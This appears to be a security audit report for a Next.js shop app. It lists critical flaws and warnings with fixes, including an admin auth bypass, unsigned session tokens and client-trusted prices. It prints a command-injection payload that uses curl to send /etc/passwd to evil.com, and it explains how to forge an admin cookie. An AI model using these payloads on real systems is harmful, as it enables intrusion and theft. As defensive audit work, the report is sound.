## Critical Issues (Fix Now)

### 1. Admin Approve Endpoint â€” Auth Check Always Bypassed (Unauthenticated Access)
**`app/api/admin/approve/route.ts:17`** â€” The guard is `if (!session?.isAdmin)`. However, `getSession()` queries the DB and returns the raw user row which has the field `is_admin` (snake_case). The `isAdmin` property is always `undefined`, so this condition is always `false` and never blocks unauthenticated callers. Any user â€” logged in or not â€” can call `POST /api/admin/approve` and approve any contact request, triggering account creation and a password email to an arbitrary address.

**Fix:** Change line 17: `session?.isAdmin` â†’ `session?.is_admin`

*Reported: 2026-04-05 â€” Unresolved for 2 cycles.*

### 2. Forgeable Session Token (Authentication Bypass)
**`lib/auth.ts:8-14`** and **`middleware.ts:14-22`** â€” The session token is `base64(userId:email:isAdmin)` with no HMAC signature. Anyone can encode `1:admin@apexprotocol.co.za:1` in base64 and set it as the `session_token` cookie to gain full admin access across both the middleware (page routing) and API routes.

**Fix:** Sign tokens using `crypto.createHmac('sha256', process.env.AUTH_SECRET).update(payload).digest('hex')` and verify the signature on every request decode in both `lib/auth.ts` and `middleware.ts`.

*Reported: 2026-03-27 â€” Unresolved for 3 cycles.*

### 5. Command Injection in Contact Form
**`app/api/contact/route.ts:48-57`** â€” User-supplied `firstName` and `lastName` from the request body are interpolated directly into a shell command string:
```js
`himalaya ... --subject "New Access Request - ${firstName} ${lastName}" --body "${tempFile}"`
```
A user submitting `lastName: 'Smith" && curl https://evil.com/exfil?db=$(cat /etc/passwd) #'` executes arbitrary commands on the server. `himalaya` is also not installed on Vercel/Cloudflare, so the contact form silently fails to send admin emails in production.

**Fix:** Remove the `himalaya` / `execAsync` block entirely. Replace with the existing `nodemailer` transporter from `lib/email.ts` â€” it already handles templated emails correctly.

*Reported: 2026-03-27 â€” Unresolved for 3 cycles.*

### 6. Hardcoded Admin Seed Password
**`lib/db.ts:53-55`** â€” The `initAdmin()` function seeds a new admin account with the hardcoded password `admin123` whenever no admin row exists. If the admin DB row is ever deleted (accidental or malicious), the password silently resets to this known value.

**Fix:** Read password from `process.env.ADMIN_SEED_PASSWORD` and throw (or log a fatal warning with startup halt) if the env var is absent.

*Reported: 2026-03-27 â€” Unresolved for 3 cycles.*

## Warnings (Fix Soon)

### 1. Two Competing Database Abstractions
**`lib/db.ts`** vs **`lib/db-pg.ts`** â€” The products API (`app/api/products/route.ts:2`) uses the native `lib/db-pg.ts` driver; all other 20+ API routes use the fragile `lib/db.ts` wrapper that converts SQLite `?` placeholders to PostgreSQL `$n` using a regex. Complex queries with embedded strings containing `?` can silently produce corrupt SQL.

**Fix:** Consolidate all routes onto `lib/db-pg.ts`. Delete `lib/db.ts`.

*Reported: 2026-03-27 â€” Unresolved for 3 cycles.*

### 2. 91 `any` Type Usages
**Multiple files** â€” `grep -rn ": any\|as any" app/ lib/ components/` returns 91 matches. Worst files: `app/admin/orders/page.tsx` (7 instances), `app/admin/page.tsx` (11 instances), `app/api/admin/sync/route.ts` (3 instances). With `strict: true` in tsconfig, these suppress genuine type errors.

### 3. Client-Submitted Prices Trusted at Checkout
**`app/api/checkout/route.ts:10`** â€” `subtotal` and `total` are read directly from `body` and inserted into the orders table. A user can POST `{ total: 1 }` to create a legitimate-looking order for R1. The email lookup at line 70 only fetches product names, not prices.

**Fix:** Re-fetch `sell_price` from DB for each `item.id` server-side after checkout POST. Recalculate `subtotal` and `total` server-side; ignore client-supplied values entirely.

*Reported: 2026-04-05 â€” Unresolved for 2 cycles.*

### 4. Admin Layout Client-Side Auth (Flash of Admin Content)
**`app/admin/layout.tsx:1`** â€” The layout is `'use client'` and checks authentication via a `useEffect` that fires after the component renders. Unauthenticated users see the admin shell (nav tabs, layout) for a brief moment before the redirect fires. This also doubles the auth overhead â€” middleware checks cookies then layout fetches `/api/auth/me` again.

**Fix:** Convert `app/admin/layout.tsx` to a server component. Call `getSession()` server-side and `redirect('/auth/login')` before returning any JSX.

*Reported: 2026-04-05 â€” Unresolved for 2 cycles.*

### 5. `require()` Calls in TypeScript ES Module Files
**`app/api/contact/route.ts:50,56`**, **`app/api/admin/approve/route.ts:42,47`**, **`lib/db.ts:53`** â€” Five CommonJS `require()` calls inside ESM TypeScript files. These break tree-shaking, prevent proper type inference, and are inconsistent with the rest of the codebase.

**Fix:** Add `import bcrypt from 'bcryptjs'` at the top of `approve/route.ts` and `db.ts`. Add `import { writeFileSync, unlinkSync } from 'fs'` at the top of `contact/route.ts` (or better: remove the himalaya block entirely per Critical #5).

### 6. `@types/react@19` vs `react@18` Major Version Mismatch
**`package.json`** â€” `@types/react` is `^19.2.14` while `react` is `^18.3.1`. React 19 type definitions include breaking API changes incompatible with the React 18 runtime, which can silently mask real type errors.

**Fix:** `npm install -D @types/react@^18.3.0 @types/react-dom@^18.3.0`

### 7. Raw `<img>` Tags Bypassing Next.js Image Optimization
**`app/cart/page.tsx:41`**, **`app/checkout/page.tsx:312`**, **`app/admin/products/page.tsx:97`** â€” Three places use raw `<img>` instead of `next/image`. Combined with `images.unoptimized: true` in `next.config.js`, no lazy loading, WebP conversion, or responsive sizing occurs.

### 8. Empty Catch Blocks Silently Swallowing Errors
**`app/checkout/page.tsx:45,48`** â€” Two `.catch(() => {})` callbacks on fetch calls silently discard errors. **`app/api/contact/route.ts:29-31`** â€” An empty `catch {}` on the `ALTER TABLE` migration ignores all errors, including database connectivity failures unrelated to "column already exists".

**Fix:** At minimum, `catch (e) { console.error('context', e); }`. For the migration catch, check `(e as Error).message.includes('already exists')` before swallowing.
